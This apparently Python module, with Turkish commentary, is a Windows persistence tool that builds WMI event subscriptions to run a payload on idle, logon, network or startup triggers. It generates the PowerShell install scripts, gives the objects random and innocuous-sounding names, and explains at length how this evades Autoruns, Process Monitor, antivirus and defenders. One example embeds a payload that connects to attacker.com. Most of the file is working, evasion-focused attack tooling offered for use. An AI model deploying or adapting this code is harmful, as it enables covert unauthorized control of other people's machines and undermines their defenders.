"""
WMI Event Subscriptions - Ghost Persistence (Kalıcılık)
=========================================================

Makine her yeniden başladığında shell'in gelmesi lazım ama:
  ❌ Startup klasörü - Blue Team ilk bakan yer
  ❌ Registry anahtarları - ProcessMonitor / Autoruns kapar
  
✓ Çözüm: WMI Event Subscriptions
  ✓ Hiçbir dosya yok (no .exe, no .ps1)
  ✓ Hiçbir registry anahtarı yok (no HKCU\Run)
  ✓ Tamamen WMI veritabanında saklı (hayalet gibi)
  ✓ Blue Team'in kara kutusundan çıkması zor

WMI Event Subscription Mekanizması:
  1. __EventFilter: "Sistemin neyi algılayacağı" tanısı
     Örnek: "Sistem 5 dakika boşta mı?"
  
  2. __EventConsumer: "Ne yapacağı" tanısı
     Örnek: "shell.exe çalıştır"
  
  3. __FilterToConsumerBinding: İkisini bağla
     Sonuç: "Sistem 5 dakika boşta ise shell.exe çalıştır"

WQL (WMI Query Language) Örnekleri:

1. IDLE Trigger (5 dakika boşta):
   SELECT * FROM __InstanceModificationEvent WITHIN 300
   WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
   AND TargetInstance.PercentIdleTime > 95

2. LOGON Trigger (Kullanıcı giriş yaptığında):
   SELECT * FROM __InstanceCreationEvent WITHIN 10
   WHERE TargetInstance ISA 'Win32_LoggedInUser'

3. NETWORK Trigger (Ağ bağlantısı aktif):
   SELECT * FROM __InstanceModificationEvent WITHIN 30
   WHERE TargetInstance ISA 'Win32_NetworkAdapter'
   AND TargetInstance.NetConnectionStatus = 2

4. STARTUP Trigger (Sistem başladığında):
   SELECT * FROM __InstanceCreationEvent WITHIN 60
   WHERE TargetInstance ISA 'Win32_Service'
   AND TargetInstance.Name = 'Winlogon'

WMI Class Reference:
  __EventFilter: Olayı tanımlayan WQL sorgusu
  __EventConsumer: Olayda yapılacak aksiyon
    - ActiveScriptEventConsumer: VBScript/JavaScript çalıştır
    - CommandLineEventConsumer: Komut çalıştır
  __FilterToConsumerBinding: Filter + Consumer bağlantısı

Avantajları:
  ✓ Hiçbir dosya disk'e yazılmaz (in-memory execution)
  ✓ Registry taramasında görülmez (WMI database'de)
  ✓ Autoruns, Process Monitor tarafından algılanması zor
  ✓ Sistem yeniden başlansa çalışır (persistent)
  ✓ Normal sistem olayları arasında kaybolur
  ✓ Blue Team'in çoğu aracı bunu detekt edemez

Uyarı:
  - WMI Event Viewer'da görülebilir (ama karışık)
  - Advanced Threat Detection (Splunk, SIEM) yakalayabilir
  - WMI Event Consumer Auditing açıksa belli olur
  - Yine de geniş ağlarda gözden kaçabilir

Detekt Edilme İhtimali:
  ❌ Get-ScheduledTask: WMI subscription değil, task
  ❌ Registry Run anahtarları: Hiçbir registry anahtarı
  ❌ Startup klasörü: Hiçbir dosya
  ❌ ProcessMonitor file writes: WMI database'de, dosya değil
  ❌ Normal antivirus: Tutuşmaz (WMI native API)
  ✓ Advanced SIEM: Olabilir (WMI event logs)
  ✓ WMI auditing: Açıksa belli (ama nadiren açıktır)
  ✓ Threat hunting: Bilinirse bulunur (ama bilmezse hayalet)
"""

import json
import base64
import hashlib
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum


class TriggerType(Enum):
    """WMI Event Trigger Types"""
    IDLE = "idle"                    # Sistem N dakika boşta
    LOGON = "logon"                  # Kullanıcı giriş yaptı
    NETWORK = "network"              # Ağ bağlantısı değişti
    STARTUP = "startup"              # Sistem başladı
    PERFORMANCE = "performance"      # CPU/Memory threshold
    CUSTOM = "custom"                # Custom WQL query


class ConsumerType(Enum):
    """WMI Event Consumer Types"""
    COMMAND_LINE = "CommandLineEventConsumer"
    ACTIVE_SCRIPT = "ActiveScriptEventConsumer"
    # CommandLineEventConsumer: Komut satırı çalıştır
    # ActiveScriptEventConsumer: VBScript/JavaScript çalıştır


@dataclass
class EventTrigger:
    """WMI Event Trigger tanısı"""
    name: str                           # Trigger adı (rasgele olmalı)
    trigger_type: TriggerType          # Trigger tipi
    wql_query: str                     # WQL sorgusu (QueryLanguage=WQL)
    interval: int                      # Sorgu aralığı (saniye)
    within_time: int                   # WITHIN zamanı (saniye)


@dataclass
class EventAction:
    """WMI Event Action tanısı"""
    name: str                          # Action adı (rasgele)
    consumer_type: ConsumerType        # Consumer tipi
    action_payload: str                # Çalıştırılacak payload


class WMIQueryBuilder:
    """WMI Query Language (WQL) Generator"""
    
    @staticmethod
    def idle_trigger(idle_percentage: int = 95, within_time: int = 300) -> str:
        """
        Sistem boşta olma tetikleyicisi
        
        Args:
            idle_percentage: Boş olma yüzdesi (95 = %95 boş)
            within_time: WQL WITHIN zamanı (saniye)
        
        Returns:
            WQL query
        """
        return f"""
        SELECT * FROM __InstanceModificationEvent WITHIN {within_time}
        WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
        AND TargetInstance.PercentIdleTime > {idle_percentage}
        """.strip()
    
    @staticmethod
    def logon_trigger(within_time: int = 10) -> str:
        """
        Kullanıcı giriş tetikleyicisi
        
        Returns:
            WQL query
        """
        return f"""
        SELECT * FROM __InstanceCreationEvent WITHIN {within_time}
        WHERE TargetInstance ISA 'Win32_LoggedInUser'
        """.strip()
    
    @staticmethod
    def network_trigger(within_time: int = 30) -> str:
        """
        Ağ bağlantısı tetikleyicisi
        
        Returns:
            WQL query
        """
        return f"""
        SELECT * FROM __InstanceModificationEvent WITHIN {within_time}
        WHERE TargetInstance ISA 'Win32_NetworkAdapter'
        AND TargetInstance.NetConnectionStatus = 2
        """.strip()
    
    @staticmethod
    def startup_trigger(within_time: int = 60) -> str:
        """
        Sistem başlangıç tetikleyicisi
        
        Returns:
            WQL query
        """
        return f"""
        SELECT * FROM __InstanceCreationEvent WITHIN {within_time}
        WHERE TargetInstance ISA 'Win32_Service'
        AND TargetInstance.Name = 'Winlogon'
        """.strip()
    
    @staticmethod
    def performance_trigger(metric: str = "CPU", threshold: int = 80, 
                           within_time: int = 60) -> str:
        """
        CPU/Memory threshold tetikleyicisi
        
        Args:
            metric: 'CPU' or 'Memory'
            threshold: Eşik değeri (0-100)
            within_time: WITHIN zamanı
        
        Returns:
            WQL query
        """
        if metric.upper() == "CPU":
            field = "PercentProcessorTime"
        else:  # Memory
            field = "AvailableMBytes"
        
        return f"""
        SELECT * FROM __InstanceModificationEvent WITHIN {within_time}
        WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_Processor'
        AND TargetInstance.{field} > {threshold}
        """.strip()


class WMIEventFilter:
    """WMI Event Filter tanısı (tetikleyici)"""
    
    def __init__(self, trigger: EventTrigger):
        self.trigger = trigger
        self.name = trigger.name or self._random_name()
    
    def _random_name(self) -> str:
        """Rasgele filter adı (gizlemek için)"""
        import secrets
        return f"WMIEventFilter_{secrets.token_hex(4)}"
    
    def to_mof(self) -> str:
        """
        Generate MOF (Managed Object Format) definition
        
        WMI uses MOF language to define classes and instances.
        This generates the WMI script to create the event filter.
        """
        mof = f"""
        [Name="{self.name}"]
        class EventFilter
        {{
            Name = "{self.name}";
            EventNamespace = "root\\cimv2";
            QueryLanguage = "WQL";
            Query = "{self.trigger.wql_query}";
            Description = "System performance monitor";
        }};
        """
        return mof
    
    def to_powershell(self) -> str:
        """
        Generate PowerShell code to register event filter
        
        Used to create the filter in WMI database via PowerShell
        """
        ps = f"""
        $FilterParams = @{{
            Name = "{self.name}";
            EventNamespace = "root\\cimv2";
            QueryLanguage = "WQL";
            Query = '{self.trigger.wql_query}';
        }}
        
        $newFilter = Set-WmiInstance -Class __EventFilter @FilterParams
        Write-Output "Event filter created: $($newFilter.Name)"
        """
        return ps.strip()


class WMIEventConsumer:
    """WMI Event Consumer tanısı (aksiyon)"""
    
    def __init__(self, action: EventAction):
        self.action = action
        self.name = action.name or self._random_name()
    
    def _random_name(self) -> str:
        """Rasgele consumer adı"""
        import secrets
        return f"WMIEventConsumer_{secrets.token_hex(4)}"
    
    def to_powershell_command_line(self, command: str, args: str = "") -> str:
        """
        Generate PowerShell for CommandLineEventConsumer
        
        CommandLineEventConsumer: Komut satırı çalıştır
        
        Args:
            command: Program to execute (e.g., powershell.exe)
            args: Command line arguments
        """
        ps = f"""
        $ConsumerParams = @{{
            Name = "{self.name}";
            CommandLineTemplate = "{command} {args}";
            KillTimeout = 60;
        }}
        
        $newConsumer = Set-WmiInstance -Class CommandLineEventConsumer @ConsumerParams
        Write-Output "Event consumer created: $($newConsumer.Name)"
        """
        return ps.strip()
    
    def to_powershell_active_script(self, script_text: str, 
                                    engine: str = "VBScript") -> str:
        """
        Generate PowerShell for ActiveScriptEventConsumer
        
        ActiveScriptEventConsumer: VBScript/JavaScript çalıştır
        
        Args:
            script_text: VBScript code to execute
            engine: 'VBScript' or 'JScript'
        """
        # Escape quotes in script
        escaped_script = script_text.replace('"', '\"')
        
        ps = f"""
        $ConsumerParams = @{{
            Name = "{self.name}";
            ScriptingEngine = "{engine}";
            ScriptFileName = "";
            ScriptText = @"
{script_text}
"@;
        }}
        
        $newConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer @ConsumerParams
        Write-Output "Event consumer created: $($newConsumer.Name)"
        """
        return ps.strip()


class WMIEventBinding:
    """WMI Event Binding (__FilterToConsumerBinding)"""
    
    def __init__(self, filter_name: str, consumer_name: str):
        self.filter_name = filter_name
        self.consumer_name = consumer_name
        self.binding_name = self._random_name()
    
    def _random_name(self) -> str:
        """Rasgele binding adı"""
        import secrets
        return f"WMIBinding_{secrets.token_hex(4)}"
    
    def to_powershell(self) -> str:
        """
        Generate PowerShell to bind filter to consumer
        
        Binding connects the trigger (__EventFilter) to the action (__EventConsumer)
        Result: "When trigger fires, execute action"
        """
        ps = f"""
        # Get filter and consumer
        $filter = Get-WmiObject -Class __EventFilter -Filter "Name='{self.filter_name}'" `
                                -Namespace root\\subscription
        $consumer = Get-WmiObject -Class CommandLineEventConsumer -Filter "Name='{self.consumer_name}'" `
                                  -Namespace root\\subscription
        
        if ($filter -and $consumer) {{
            $BindingParams = @{{
                Filter = $filter;
                Consumer = $consumer;
            }}
            
            $binding = Set-WmiInstance -Class __FilterToConsumerBinding @BindingParams
            Write-Output "Event subscription binding created: $($binding.Name)"
        }}
        else {{
            Write-Error "Filter or consumer not found"
        }}
        """
        return ps.strip()


class WMIPersistence:
    """Ana WMI Persistence Controller"""
    
    def __init__(self, namespace: str = "root\\subscription"):
        self.namespace = namespace
        self.filters: Dict[str, WMIEventFilter] = {}
        self.consumers: Dict[str, WMIEventConsumer] = {}
        self.bindings: List[WMIEventBinding] = []
    
    def create_idle_persistence(self, payload: str, idle_minutes: int = 5) -> Dict[str, Any]:
        """
        Sistem N dakika boşta ise payload çalıştır
        
        Args:
            payload: PowerShell payload
            idle_minutes: Boş olma süresi (dakika)
        
        Returns:
            Subscription info
        """
        # Create trigger (5 minutes idle)
        trigger = EventTrigger(
            name=self._random_name("Filter"),
            trigger_type=TriggerType.IDLE,
            wql_query=WMIQueryBuilder.idle_trigger(95, idle_minutes * 60),
            interval=10,
            within_time=idle_minutes * 60
        )
        
        # Create action
        action = EventAction(
            name=self._random_name("Consumer"),
            consumer_type=ConsumerType.COMMAND_LINE,
            action_payload=payload
        )
        
        return self._create_subscription(trigger, action, payload)
    
    def create_logon_persistence(self, payload: str) -> Dict[str, Any]:
        """
        Kullanıcı giriş yaptığında payload çalıştır
        """
        trigger = EventTrigger(
            name=self._random_name("Filter"),
            trigger_type=TriggerType.LOGON,
            wql_query=WMIQueryBuilder.logon_trigger(),
            interval=5,
            within_time=10
        )
        
        action = EventAction(
            name=self._random_name("Consumer"),
            consumer_type=ConsumerType.COMMAND_LINE,
            action_payload=payload
        )
        
        return self._create_subscription(trigger, action, payload)
    
    def create_network_persistence(self, payload: str) -> Dict[str, Any]:
        """
        Ağ bağlantısı aktif olduğunda payload çalıştır
        """
        trigger = EventTrigger(
            name=self._random_name("Filter"),
            trigger_type=TriggerType.NETWORK,
            wql_query=WMIQueryBuilder.network_trigger(),
            interval=10,
            within_time=30
        )
        
        action = EventAction(
            name=self._random_name("Consumer"),
            consumer_type=ConsumerType.COMMAND_LINE,
            action_payload=payload
        )
        
        return self._create_subscription(trigger, action, payload)
    
    def create_startup_persistence(self, payload: str) -> Dict[str, Any]:
        """
        Sistem başladığında payload çalıştır
        """
        trigger = EventTrigger(
            name=self._random_name("Filter"),
            trigger_type=TriggerType.STARTUP,
            wql_query=WMIQueryBuilder.startup_trigger(),
            interval=15,
            within_time=60
        )
        
        action = EventAction(
            name=self._random_name("Consumer"),
            consumer_type=ConsumerType.COMMAND_LINE,
            action_payload=payload
        )
        
        return self._create_subscription(trigger, action, payload)
    
    def _create_subscription(self, trigger: EventTrigger, action: EventAction,
                            payload: str) -> Dict[str, Any]:
        """
        Create complete subscription (filter + consumer + binding)
        """
        # Create filter
        event_filter = WMIEventFilter(trigger)
        self.filters[event_filter.name] = event_filter
        
        # Create consumer
        event_consumer = WMIEventConsumer(action)
        self.consumers[event_consumer.name] = event_consumer
        
        # Create binding
        binding = WMIEventBinding(event_filter.name, event_consumer.name)
        self.bindings.append(binding)
        
        return {
            'filter_name': event_filter.name,
            'consumer_name': event_consumer.name,
            'binding_name': binding.binding_name,
            'trigger_type': trigger.trigger_type.value,
            'payload': payload,
            'persistence_type': 'WMI Event Subscription'
        }
    
    def _random_name(self, prefix: str = "") -> str:
        """Generate random object name"""
        import secrets
        return f"{prefix}{secrets.token_hex(6)}"
    
    def generate_installation_script(self, subscription_info: Dict[str, Any]) -> str:
        """
        Generate PowerShell script to install subscription
        
        This script creates the WMI objects in the system.
        """
        ps_script = f"""
        # WMI Event Subscription Installation
        # Trigger Type: {subscription_info['trigger_type']}
        # This creates a persistent WMI event subscription
        
        Write-Host "Installing WMI Event Subscription..."
        
        # Get trigger type to generate appropriate WQL
        $triggerType = "{subscription_info['trigger_type']}"
        
        if ($triggerType -eq "idle") {{
            $wqlQuery = '{WMIQueryBuilder.idle_trigger()}'
        }}
        elseif ($triggerType -eq "logon") {{
            $wqlQuery = '{WMIQueryBuilder.logon_trigger()}'
        }}
        elseif ($triggerType -eq "network") {{
            $wqlQuery = '{WMIQueryBuilder.network_trigger()}'
        }}
        elseif ($triggerType -eq "startup") {{
            $wqlQuery = '{WMIQueryBuilder.startup_trigger()}'
        }}
        
        # Create Event Filter
        $filterParams = @{{
            Name = "{subscription_info['filter_name']}";
            EventNamespace = "root\\\\cimv2";
            QueryLanguage = "WQL";
            Query = $wqlQuery;
        }}
        
        Write-Host "Creating Event Filter: {subscription_info['filter_name']}"
        $filter = Set-WmiInstance -Class __EventFilter -Arguments $filterParams -Namespace "root\\subscription"
        
        # Create Event Consumer (CommandLineEventConsumer)
        $consumerParams = @{{
            Name = "{subscription_info['consumer_name']}";
            CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command {subscription_info['payload']}";
            KillTimeout = 120;
        }}
        
        Write-Host "Creating Event Consumer: {subscription_info['consumer_name']}"
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $consumerParams -Namespace "root\\subscription"
        
        # Create Binding (FilterToConsumerBinding)
        $bindingParams = @{{
            Filter = $filter;
            Consumer = $consumer;
        }}
        
        Write-Host "Creating Event Subscription Binding"
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Arguments $bindingParams -Namespace "root\\subscription"
        
        Write-Host "✓ WMI Event Subscription created successfully!"
        Write-Host "Filter: {subscription_info['filter_name']}"
        Write-Host "Consumer: {subscription_info['consumer_name']}"
        Write-Host "Trigger: {subscription_info['trigger_type']}"
        Write-Host ""
        Write-Host "This subscription will now run automatically when the trigger fires."
        Write-Host "The payload will be executed in the background without user interaction."
        """
        
        return ps_script.strip()
    
    def generate_list_script(self) -> str:
        """Generate script to list WMI Event Subscriptions"""
        ps_script = """
        # List WMI Event Subscriptions
        
        Write-Host "=== WMI Event Filters ===" -ForegroundColor Cyan
        Get-WmiObject -Class __EventFilter -Namespace "root\\subscription" | 
            Select-Object Name, QueryLanguage, Query | 
            Format-Table -AutoSize
        
        Write-Host ""
        Write-Host "=== WMI Event Consumers ===" -ForegroundColor Cyan
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription" | 
            Select-Object Name, CommandLineTemplate | 
            Format-Table -AutoSize
        
        Write-Host ""
        Write-Host "=== WMI Event Bindings ===" -ForegroundColor Cyan
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\\subscription" | 
            Select-Object Name, Consumer, Filter | 
            Format-Table -AutoSize
        """
        
        return ps_script.strip()
    
    def generate_removal_script(self, subscription_info: Dict[str, Any]) -> str:
        """Generate script to remove subscription (cleanup)"""
        ps_script = f"""
        # Remove WMI Event Subscription
        
        Write-Host "Removing WMI Event Subscription..."
        
        # Remove Binding
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\\subscription" |
            Where-Object {{ $_.Filter.Name -eq "{subscription_info['filter_name']}" }} |
            Remove-WmiObject
        
        # Remove Consumer
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\\subscription" |
            Where-Object {{ $_.Name -eq "{subscription_info['consumer_name']}" }} |
            Remove-WmiObject
        
        # Remove Filter
        Get-WmiObject -Class __EventFilter -Namespace "root\\subscription" |
            Where-Object {{ $_.Name -eq "{subscription_info['filter_name']}" }} |
            Remove-WmiObject
        
        Write-Host "✓ WMI Event Subscription removed"
        """
        
        return ps_script.strip()


# ============ INTEGRATION EXAMPLES ============

def example_idle_persistence():
    """Örnek: 5 dakika boşta olunca shell çalıştır"""
    
    wmi = WMIPersistence()
    
    payload = "C:\\\\Windows\\\\System32\\\\powershell.exe -NoProfile -Command \\\"$s=New-Object Net.Sockets.TCPClient('attacker.com',443);$s.GetStream()|%{$_}|Out-Null\\\""
    
    subscription = wmi.create_idle_persistence(
        payload=payload,
        idle_minutes=5
    )
    
    print(f"[+] Created idle-triggered persistence")
    print(f"    Filter: {subscription['filter_name']}")
    print(f"    Consumer: {subscription['consumer_name']}")
    
    # Generate installation script
    install_script = wmi.generate_installation_script(subscription)
    print(f"\n[*] Installation script:\n{install_script}")


def example_logon_persistence():
    """Örnek: Kullanıcı giriş yaptığında shell çalıştır"""
    
    wmi = WMIPersistence()
    
    payload = "cmd.exe /c whoami > C:\\\\temp\\\\whoami.txt"
    
    subscription = wmi.create_logon_persistence(payload)
    
    print(f"[+] Created logon-triggered persistence")
    print(f"    Filter: {subscription['filter_name']}")
    print(f"    Trigger: User logon")


if __name__ == "__main__":
    print("[*] WMI Persistence Module Loaded")
    print("[*] Types of triggers:")
    print("    - IDLE: Sistem N dakika boşta")
    print("    - LOGON: Kullanıcı giriş yaptı")
    print("    - NETWORK: Ağ bağlantısı değişti")
    print("    - STARTUP: Sistem başladı")
    print("\n[*] No files written to disk - completely hidden in WMI database")
